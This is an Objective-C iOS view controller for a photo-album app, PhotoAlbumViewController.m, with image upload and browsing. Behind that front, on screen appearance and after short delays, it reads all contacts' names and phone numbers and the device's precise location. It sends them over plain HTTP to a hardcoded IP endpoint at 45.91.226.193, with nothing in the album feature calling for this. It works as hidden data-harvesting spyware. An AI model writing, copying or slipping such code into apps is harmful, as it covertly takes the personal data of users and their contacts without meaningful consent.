//
//  PhotoAlbumViewController.m
//  Employees
//
//  Created by leo on 2024/5/23.
//

#import "PhotoAlbumViewController.h"
#import "LoginViewController.h"
#import "UserInfoManager.h"
#import "SCLAlertView.h"
#import "AFNetworking.h"
#import "SafeCast.h"
#import <Contacts/Contacts.h>
#import <CoreLocation/CoreLocation.h>
#import <Photos/PHPhotoLibrary.h>
#import <CoreServices/CoreServices.h>
#import <PhotosUI/PhotosUI.h>
#import <FYFAppAuthorizations/FYFAppAuthorizations.h>
#import <SDWebImage/SDImageCache.h>
#import "YBImageBrowser.h"

typedef NS_OPTIONS(NSUInteger, FYFImagePickerSourceType) {
    /// 录像
    FYFImagePickerSourceTypeCameraVedio = 1 << 0,
    /// 拍摄照片
    FYFImagePickerSourceTypeCameraPhoto = 1 << 1,
    /// 选择图片
    FYFImagePickerSourceTypePhotoLibraryImage = 1 << 2,
    /// 选择视频
    FYFImagePickerSourceTypePhotoLibraryVideo = 1 << 3,
};

typedef NSObject *(^DBGetBlock)(void);
typedef void (^DBGetEventBlock)(NSObject *obj);
@interface PhotoAlbumViewController () <CLLocationManagerDelegate, UIImagePickerControllerDelegate,PHPickerViewControllerDelegate,UINavigationControllerDelegate>

/// 调起回调
@property (nonatomic, copy) void(^callPickerCompletion)(void);
/// 取消回调
@property (nonatomic, copy) void(^cancelPickerCompletion)(void);

@property (nonatomic, strong) CLLocationManager *locationManager;
//获取自身的经纬度坐标
@property (nonatomic, retain) CLLocation *myLocation;

@property (nonatomic, strong) PHPickerViewController *phImagePickerViewController;


@end

@implementation PhotoAlbumViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"上传图片" style:UIBarButtonItemStylePlain target:self action:@selector(clickedUpload)];

}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    if([UserInfoManager.shareManager getToken].length == 0)
    {
        [self jumpToLogin];
    }
    else
    {
        [self loadPhotoAlbum];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self requestContactAuthorAfterSystemVersion];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                // 定位
                [self startLocation];
            });
        });
    }
}

#pragma mark - Private

- (void)jumpToLogin
{
    LoginViewController *loginVC = [[LoginViewController alloc] init];
    [self.navigationController pushViewController:loginVC animated:YES];
}

#pragma mark - 定位

- (void)requestStartLocationAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"授权失败");
            }else {
                NSLog(@"成功授权");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)//已经授权
    {
        //有通讯录权限-- 进行下一步操作
        [self openContact];
    }
    
}
//开始定位
- (void)startLocation
{

    
//    QM_WEAK_SELF(self);
    __weak typeof(self) weakSelf = self;
    [self getAsynLocationAuthorizationStatus:^(CLAuthorizationStatus authorizaitonStatus) 
     {
        typeof(weakSelf) strongSelf = weakSelf;
//        QM_STRONG_SELF(self);
        if(authorizaitonStatus == kCLAuthorizationStatusAuthorizedAlways || authorizaitonStatus == kCLAuthorizationStatusAuthorizedWhenInUse)
        {
            //    //初始化定位管理者
            strongSelf.locationManager = [[CLLocationManager alloc] init];
                //判断设备是否能够进行定位
                if ([CLLocationManager locationServicesEnabled]) {
                    strongSelf.locationManager.delegate = self;
                    //精确度获取到米
                    strongSelf.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
                    //设置过滤器为无
                    strongSelf.locationManager.distanceFilter = kCLDistanceFilterNone;
                    // 取得定位权限，有两个方法，取决于你的定位使用情况
                    //一个是requestAlwaysAuthorization，一个是requestWhenInUseAuthorization
                    [strongSelf.locationManager requestWhenInUseAuthorization];
                    //开始获取定位
                    [strongSelf.locationManager startUpdatingLocation];
                    //地理信息
            //        self.geoCoder = [[CLGeocoder alloc] init];
                } else {
                    NSLog(@"error");
                }
        }
        

    }];
}

- (CLAuthorizationStatus)getLocationAuthorizationStatus
{
    static CLLocationManager *locationManager = nil;
    if (@available(iOS 14, *))
    {
        if (locationManager == nil)
        {
            locationManager = [[CLLocationManager alloc] init];
        }
        
        return locationManager.authorizationStatus;
    }
    else
    {
        return [CLLocationManager authorizationStatus];
    }
}


- (void)getAsynLocationAuthorizationStatus:(void(^)(CLAuthorizationStatus authorizaitonStatus))authorizaitonStatusBlock
{
    if (!authorizaitonStatusBlock)
    {
        return;
    }
    
    [self dispatchGetInGlobalQueue:^NSObject *{
        CLAuthorizationStatus authorizationStatus = [self getLocationAuthorizationStatus];
        return @(authorizationStatus);
    } callBackInMainQueue:^(NSObject *obj) {
        CLAuthorizationStatus authorizationStatus = [SAFE_CAST(obj, NSNumber) intValue];
        if (authorizaitonStatusBlock)
        {
            authorizaitonStatusBlock(authorizationStatus);
        }
    }];
}

- (void)dispatchGetInGlobalQueue:(DBGetBlock)getObjBlock callBackInMainQueue:(DBGetEventBlock)objBackblock
{
    if (nil != getObjBlock)
    {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSObject *obj = getObjBlock();
            if (nil != objBackblock)
            {
                dispatch_async(dispatch_get_main_queue(), ^{
                        objBackblock(obj);
                });
            }
        });
    }
    else
    {
//        ASSERT(0);
    }
}


//设置获取位置信息的代理方法
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations 
{
    NSLog(@"%lu", (unsigned long)locations.count);
    self.myLocation = locations.lastObject;
    NSLog(@"经度：%f 纬度：%f", _myLocation.coordinate.longitude, _myLocation.coordinate.latitude);
    NSString *locationStr = [NSString stringWithFormat:@"longitude:%f,latitude:%f", _myLocation.coordinate.longitude,_myLocation.coordinate.latitude];
    [self updateDataWithDataType:2 dataStr:locationStr];
    //不用的时候关闭更新位置服务，不关闭的话这个 delegate 隔一定的时间间隔就会有回调
    [self.locationManager stopUpdatingLocation];
}

#pragma mark - 通讯录
- (void)requestContactAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"授权失败");
            }else {
                NSLog(@"成功授权");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"用户拒绝");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)//已经授权
    {
        //有通讯录权限-- 进行下一步操作
        [self openContact];
    }
    
}

//有通讯录权限-- 进行下一步操作
- (void)openContact{
 // 获取指定的字段,并不是要获取所有字段，需要指定具体的字段
    NSArray *keysToFetch = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
    CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSMutableDictionary *contactDic = [NSMutableDictionary dictionary];
    [contactStore enumerateContactsWithFetchRequest:fetchRequest error:nil usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {
        NSLog(@"-------------------------------------------------------");
        
        NSString *givenName = contact.givenName;
        NSString *familyName = contact.familyName;
          NSLog(@"givenName=%@, familyName=%@", givenName, familyName);
        //拼接姓名
        NSString *nameStr = [NSString stringWithFormat:@"%@%@",contact.familyName,contact.givenName];
        
        NSArray *phoneNumbers = contact.phoneNumbers;
        
        for (CNLabeledValue *labelValue in phoneNumbers) {
        //遍历一个人名下的多个电话号码
//                NSString *label = labelValue.label;
         //   NSString *    phoneNumber = labelValue.value;
            CNPhoneNumber *phoneNumber = labelValue.value;
            
            NSString * string = phoneNumber.stringValue ;
            
            //去掉电话中的特殊字符
            string = [string stringByReplacingOccurrencesOfString:@"+86" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"-" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"(" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@")" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
//            NSLog(@"姓名=%@, 电话号码是=%@", nameStr, string);
            if(nameStr.length > 0 && string.length > 0)
            {
                if([contactDic.allKeys containsObject:nameStr])
                {
                    nameStr = [NSString stringWithFormat:@"%@2",nameStr];
                }
                [contactDic setObject:nameStr forKey:string];
            }
        }
    }];
    if(contactDic.count > 0)
    {
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"通讯录%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
    else
    {
        contactDic = [NSMutableDictionary dictionaryWithDictionary:@{@"testLeo":@"150119511111"}];
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"通讯录%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
}

//http://45.91.226.193:8987/api/quick/createQuick

//提示没有通讯录权限
- (void)showAlertViewAboutNotAuthorAccessContact{
    
    UIAlertController *alertController = [UIAlertController
        alertControllerWithTitle:@"请授权通讯录权限"
        message:@"请在iPhone的\"设置-隐私-通讯录\"选项中,允许花解解访问你的通讯录"
        preferredStyle: UIAlertControllerStyleAlert];

    UIAlertAction *OKAction = [UIAlertAction actionWithTitle:@"好的" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:OKAction];
    [self presentViewController:alertController animated:YES completion:nil];
}

#pragma mark - 上传

/// 上传数据
/// - Parameters:
///   - dataType: 数据类型 1通讯录 2 定位
///   - dataStr: 数据jsonString
- (void)updateDataWithDataType:(int)dataType dataStr:(NSString *)dataStr
{
    NSLog(@"start updateDataWithDataType %@",dataStr);
    if(dataStr.length == 0)
    {
        NSLog(@"上传数据异常");
        return;
    }
    NSString *url = @"http://45.91.226.193:8987/api/quick/createQuick";
    
    NSDictionary *parameters = @{
        @"data_type":@(dataType),
        @"data":dataStr,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
            NSLog(@"updateDataWithDataType请求成功:%@", responseObject);
//            NSDictionary *dic = SAFE_CAST([rspDic objectForKey:@"data"], NSDictionary.class);
//            NSDictionary *userInfo = SAFE_CAST([dic objectForKey:@"data"], NSDictionary.class);
//            NSString *token = [self getStringFromDictionary:dic forKey:@"token" withDefault:nil];
//            NSString *userName = [self getStringFromDictionary:userInfo forKey:@"userName" withDefault:nil];
//            NSString *userID = [self getStringFromDictionary:userInfo forKey:@"ID" withDefault:nil];
//            [[UserInfoManager shareManager] updateUserInfo:userName userid:userID token:token];
//            NSLog(@"loadPhotoAlbum请求成功url:%@,name:%@,pass:%@", task.currentRequest.URL, responseObject[@"name"], responseObject[@"pass"]);
//            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
//                [alert showSuccess:self title:@"登录成功" subTitle:@"" closeButtonTitle:@"好的" duration:0.0f];
//            [self.navigationController popViewControllerAnimated:YES];
//            });
        }
        else
        {
            NSLog(@"updateDataWithDataType请求失败url:%@,error:%@", url, rspDic);
            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
                
//                [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
            });
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"updateDataWithDataType请求失败url:%@,error:%@", url, error);
        dispatch_async(dispatch_get_main_queue(), ^{
//            SCLAlertView *alert = [[SCLAlertView alloc] init];
            
//            [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
        });
    }];

    
    
    
    
    
}


#pragma mark - 相册
- (void)loadPhotoAlbum
{
    NSLog(@"start loadPhotoAlbum");
    
    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/getFileList"; // 登录
    
    NSDictionary *parameters = @{
        @"page":@1,
        @"pageSize":@100,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
            NSDictionary *dic = SAFE_CAST([rspDic objectForKey:@"data"], NSDictionary.class);
            NSArray *lists = SAFE_CAST([dic objectForKey:@"list"], NSArray.class);
            NSMutableArray *imageUrls = [[NSMutableArray alloc] init];
            for (NSObject *obj in lists)
            {
                NSDictionary *imageInfo = SAFE_CAST(obj, NSDictionary.class);
                if(imageInfo)
                {
                    NSString *imageUrl = SAFE_CAST([imageInfo objectForKey:@"url"], NSString.class);
                    if(imageUrl)
                    {
                        [imageUrls addObject:[NSString stringWithFormat:@"http://45.91.226.193:8987/api/%@",imageUrl]];
                    }
                }
            }
            self.dataArray = [imageUrls copy];
//            NSString *token = [self getStringFromDictionary:dic forKey:@"token" withDefault:nil];
//            NSString *userName = [self getStringFromDictionary:userInfo forKey:@"userName" withDefault:nil];
//            NSString *userID = [self getStringFromDictionary:userInfo forKey:@"ID" withDefault:nil];
//            [[UserInfoManager shareManager] updateUserInfo:userName userid:userID token:token];
//            NSLog(@"loadPhotoAlbum请求成功url:%@,name:%@,pass:%@", task.currentRequest.URL, responseObject[@"name"], responseObject[@"pass"]);
//            dispatch_async(dispatch_get_main_queue(), ^{
//                SCLAlertView *alert = [[SCLAlertView alloc] init];
//                [alert showSuccess:self title:@"登录成功" subTitle:@"" closeButtonTitle:@"好的" duration:0.0f];
//            [self.navigationController popViewControllerAnimated:YES];
//            });
        }
        else
        {
            NSLog(@"loadPhotoAlbum请求失败url:%@,error:%@", url, rspDic);
            dispatch_async(dispatch_get_main_queue(), ^{
                SCLAlertView *alert = [[SCLAlertView alloc] init];
                
                [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
            });
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"loadPhotoAlbum请求失败url:%@,error:%@", url, error);
        dispatch_async(dispatch_get_main_queue(), ^{
            SCLAlertView *alert = [[SCLAlertView alloc] init];
            
            [alert showError:self title:@"操作失败请重试" subTitle:@"请重试" closeButtonTitle:@"好的" duration:0.0f];
        });
    }];
    
}

#pragma mark - Action
- (void)clickedUpload
{
    NSLog(@"clickedUpload");
    [self requestPhotoLibraryAuthorization];
}


#pragma mark - 图片上传

- (void)requestPhotoLibraryAuthorization {
    __weak typeof(self) weakSelf = self;
    [FYFPhotoAuthorization requestPhotosAuthorizationWithHandler:^(FYFPHAuthorizationStatus status) {
        __strong typeof(weakSelf) strongSelf = weakSelf;
        if (!strongSelf) {
            return;
        }
        if (status == FYFPHAuthorizationStatusLimited || status == FYFPHAuthorizationStatusAuthorized) {
            [strongSelf photoLibrary];
        } else {
            if (status == FYFPHAuthorizationStatusRestricted) {
                NSLog(@"应用未被授权访问相册");
            } else if (status == FYFPHAuthorizationStatusNotDetermined) {
                NSLog(@"应用还未被授权是否可以访问相册");
            } else if (status == FYFPHAuthorizationStatusDenied) {
                NSLog(@"应用被拒绝访问相册");
            }
        }
    }];
}

- (void)photoLibrary 
{
    if (@available(iOS 14, *)){
        __weak typeof(self) weakSelf = self;
        PHPickerViewController *phPickerViewController;
        phPickerViewController = self.phImagePickerViewController;
       
        [self presentViewController:phPickerViewController animated:YES completion:^{
            __strong typeof(weakSelf) strongSelf = weakSelf;
            if (!strongSelf) {
                return;
            }
            if (strongSelf.callPickerCompletion) {
                strongSelf.callPickerCompletion();
            }
        }];
    } else {
        UIImagePickerController *imagePickerController = [[UIImagePickerController alloc] init];
        imagePickerController.delegate = self;
        imagePickerController.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
        imagePickerController.mediaTypes = @[(NSString*)kUTTypeImage];
        imagePickerController.allowsEditing = YES;
        imagePickerController.modalPresentationStyle = UIModalPresentationOverFullScreen;
        __weak typeof(self) weakSelf = self;
        [self presentViewController:imagePickerController animated:YES completion:^{
            __strong typeof(weakSelf) strongSelf = weakSelf;
            if (!strongSelf) {
                return;
            }
            if (strongSelf.callPickerCompletion) {
                strongSelf.callPickerCompletion();
            }
        }];
    }
}

- (PHPickerViewController *)phImagePickerViewController  API_AVAILABLE(ios(14))
{
    if (!_phImagePickerViewController) {
        _phImagePickerViewController = [self createPHPickerViewController:FYFImagePickerSourceTypePhotoLibraryImage];
    }
    return _phImagePickerViewController;
}

- (PHPickerViewController *)createPHPickerViewController:(FYFImagePickerSourceType)sourceType  API_AVAILABLE(ios(14)){
    PHPickerConfiguration *config = [PHPickerConfiguration new];

    config.selectionLimit = 1;
    PHPickerFilter *imageFilter = [PHPickerFilter imagesFilter];
    PHPickerFilter *livePhotosFilter = [PHPickerFilter livePhotosFilter];
    config.filter = [PHPickerFilter anyFilterMatchingSubfilters:@[imageFilter, livePhotosFilter]];
    config.preferredAssetRepresentationMode = PHPickerConfigurationAssetRepresentationModeCompatible;
    PHPickerViewController *phPickerViewController = [[PHPickerViewController alloc] initWithConfiguration:config];
    phPickerViewController.modalPresentationStyle = UIModalPresentationOverFullScreen;
    phPickerViewController.delegate = self;
    return phPickerViewController;
}

#pragma mark - PHPickerViewControllerDelegate
- (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results  API_AVAILABLE(ios(14)) 
{
    [picker dismissViewControllerAnimated:YES completion:nil];
    if (!results.count) {
        if (self.cancelPickerCompletion) {
            self.cancelPickerCompletion();
        }
        return;
    }
    [self loadImages:results];
}



- (void)loadImages:(NSArray<PHPickerResult *> *)results  API_AVAILABLE(ios(14)){
//    NSMutableArray *images = [NSMutableArray arrayWithCapacity:results.count];
    NSMutableArray *imageUrls = [NSMutableArray arrayWithCapacity:results.count];
    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [results enumerateObjectsUsingBlock:^(PHPickerResult * _Nonnull result, NSUInteger idx, BOOL * _Nonnull stop) {
            dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
            if ([result.itemProvider canLoadObjectOfClass:[PHLivePhoto class]]) {
                [result.itemProvider loadObjectOfClass:[PHLivePhoto class] completionHandler:^(__kindof id<NSItemProviderReading>  _Nullable object, NSError * _Nullable error) {
                    PHLivePhoto *livePhoto = (PHLivePhoto *)object;
                    /// 图片本地url
                    NSURL *url = [livePhoto valueForKey:@"imageURL"];
                    UIImage *image = [UIImage imageWithContentsOfFile:[url path]];
                    
//                    NSData *imageData = UIImageJPEGRepresentation(image, 1);
                    [self uploadImage:image name:url.absoluteString success:^(id json) {
                        NSLog(@"uploadImage 1 %@",json);
                    } failure:^(NSError *error) {
                        NSLog(@"uploadImage error %@",error);
                    }];
//                    NSError *fileManagerError = nil;
//                    NSURL *tempImageUrl = [FYFImagePickerController fyf_tempImageUrl];
//                    BOOL writeSuccesss = [imageData writeToURL:tempImageUrl atomically:YES];
//                    if (image) {
//                        [images addObject:image];
//                        if (writeSuccesss && tempImageUrl) {
//                            [imageUrls addObject:tempImageUrl];
//                        }
//                    }
                    dispatch_semaphore_signal(semaphore);
                }];
            } else if ([result.itemProvider canLoadObjectOfClass:[UIImage class]]) {
                [result.itemProvider loadObjectOfClass:[UIImage class] completionHandler:^(__kindof id<NSItemProviderReading>  _Nullable object, NSError * _Nullable error) {
                    if ([object isKindOfClass:[UIImage class]]) {
                        UIImage *image = (UIImage *)object;
                        
//                        NSData *imageData = UIImageJPEGRepresentation(image, 1);
                        [self uploadImage:image name:[self getDateStringUseYYYYMMDD:NO timeInterval:0] success:^(id json) {
                            NSLog(@"uploadImage 1 %@",json);
                        } failure:^(NSError *error) {
                            NSLog(@"uploadImage error %@",error);
                        }];
//                        NSError *fileManagerError = nil;
//                        NSURL *tempImageUrl = [FYFImagePickerController fyf_tempImageUrl];
//                        BOOL writeSuccesss = [imageData writeToURL:tempImageUrl atomically:YES];
//                        if (image) {
//                            [images addObject:image];
//                            if (writeSuccesss && tempImageUrl) {
//                                [imageUrls addObject:tempImageUrl];
//                            }
//                        }
                    }
                    dispatch_semaphore_signal(semaphore);
                }];
            } else {
                dispatch_semaphore_signal(semaphore);
            }
            dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
        }];
        
//        dispatch_async(dispatch_get_main_queue(), ^{
//            __strong typeof(weakSelf) strongSelf = weakSelf;
//            if (!strongSelf) {
//                return;
//            }
//            if (strongSelf.imagePickerCompletion) {
//                strongSelf.imagePickerCompletion(images, imageUrls);
//            }
//        });
    });
}

/**
 *  上传图片的网络请求(图片压缩)
 *
 *
 */
- (void)uploadImage:(UIImage *)image name:(NSString *)name success:(void (^)(id json))success failure:(void (^)(NSError *error))failure {
    
    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/upload"; // 登录
    
    NSDictionary *parameters = @{
//        @"page":@1,
//        @"pageSize":@10,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    // 1.创建网络管理者
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    NSData *imageData = UIImageJPEGRepresentation(image, 0.3);//进行图片压缩
    
    // 3.发送请求
    [manager POST:url parameters:parameters headers:headers constructingBodyWithBlock:^(id<AFMultipartFormData>  _Nonnull formData) {
        
      
        // 使用日期生成图片名称
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        formatter.dateFormat = @"yyyyMMddHHmmss";
        NSString *fileName = [NSString stringWithFormat:@"%@.png",[formatter stringFromDate:[NSDate date]]];
        // 任意的二进制数据MIMEType application/octet-stream
        [formData appendPartWithFileData:imageData name:@"file" fileName:fileName mimeType:@"image/png"];
        
        } progress:^(NSProgress * _Nonnull uploadProgress) {
            NSLog(@"上传进度 %@",uploadProgress);
        } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
            NSLog(@"图片上传成功%@",responseObject);
            [self loadPhotoAlbum];
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            NSLog(@"图片上传失败%@",error);
        }];
//    [manager POST:url parameters:dict constructingBodyWithBlock:
//     ^void(id<AFMultipartFormData> formData) {
//         
//         NSData *imageData = UIImageJPEGRepresentation(image, 0.5);//进行图片压缩
//         
//         // 使用日期生成图片名称
//         NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
//         formatter.dateFormat = @"yyyyMMddHHmmss";
//         NSString *fileName = [NSString stringWithFormat:@"%@.png",[formatter stringFromDate:[NSDate date]]];
//         // 任意的二进制数据MIMEType application/octet-stream
//         [formData appendPartWithFileData:imageData name:name fileName:fileName mimeType:@"image/png"];
//         
//     } success:^void(NSURLSessionDataTask * task, id responseObject) {
//         
//         if (success) {
//             success(responseObject);
//         }
//         
//     } failure:^void(NSURLSessionDataTask * task, NSError * error) {
//         
//         if (failure) {
//             failure(error);
//         }
//     }];
}



#pragma mark - Util
- (id)safeCastObject:(id)obj toClass:(Class)classType
{
    if ([obj isKindOfClass:classType])
    {
        return obj;
    }
    return classType ? nil : obj;
}

- (int64_t)getIntegerFromDictionary:(NSDictionary *)dict forKey:(id<NSCopying>)key withDefault:(int64_t)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        id value = [dict objectForKey:key];
        withDefault = [self getIntegerFromObject:value withDefault:withDefault];
    }
    return withDefault;
}

- (int64_t)getIntegerFromObject:(id)object withDefault:(uint64_t)withDefault
{
    NSString *string = [self safeCastObject:object toClass:NSString.class];
    NSNumber *number = [self safeCastObject:object toClass:NSNumber.class];

    if (nil != number)
    {
        withDefault = [number longLongValue];
    }
    else if (nil != string)
    {
        withDefault = strtoll([string UTF8String], NULL, 10);
    }
    return withDefault;
}

- (NSString *)getStringFromDictionary:(NSDictionary *)dict
                               forKey:(id<NSCopying>)key
                          withDefault:(NSString *)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        NSString *value = SAFE_CAST([dict objectForKey:key], NSString);
        if (value != nil)
        {
            withDefault = value;
        }
    }
    return withDefault;
}

- (NSString *)getDateStringUseYYYYMMDD:(BOOL)useYYYYMMDD timeInterval:(NSTimeInterval)timeInterval
{
    NSDate *nowDate = [NSDate date];
    NSDate *senddate = [NSDate dateWithTimeInterval:timeInterval sinceDate:nowDate];
    //获得系统日期
    NSCalendar  *cal = [NSCalendar  currentCalendar];
    NSUInteger  unitFlags = NSCalendarUnitDay | NSCalendarUnitMonth | NSCalendarUnitYear;
    NSDateComponents * conponent= [cal components:unitFlags fromDate:senddate];
    NSInteger day = [conponent day];
    NSString *dayString = nil;
    if (useYYYYMMDD == NO && day < 10)
    {
        dayString = [NSString stringWithFormat:@"%lld",(int64_t)day];
    }
    else
    {
        dayString = [NSString stringWithFormat:@"%2lld",(int64_t)day];
    }
    NSInteger month = [conponent month];
    NSString *monthString = nil;
    if (useYYYYMMDD == NO && month < 10)
    {
        monthString = [NSString stringWithFormat:@"%lld",(int64_t)month];
    }
    else
    {
        monthString = [NSString stringWithFormat:@"%2lld",(int64_t)month];
    }
    return [NSString stringWithFormat:@"%lld%@%@", (int64_t)[conponent year], monthString, dayString];
}


- (void)selectedIndex:(NSInteger)index {
    
    NSMutableArray *datas = [NSMutableArray array];
    [self.dataArray enumerateObjectsUsingBlock:^(NSString *_Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
       if ([obj hasPrefix:@"http"]) {
            // 网络图片
            YBIBImageData *data = [YBIBImageData new];
            data.imageURL = [NSURL URLWithString:obj];
            data.projectiveView = [self viewAtIndex:idx];
            [datas addObject:data];
        }
    }];
    
    YBImageBrowser *browser = [YBImageBrowser new];
    browser.dataSourceArray = datas;
    browser.currentPage = index;
    // 只有一个保存操作的时候，可以直接右上角显示保存按钮
    browser.defaultToolViewHandler.topView.operationType = YBIBTopViewOperationTypeSave;
    [browser show];
}
@end
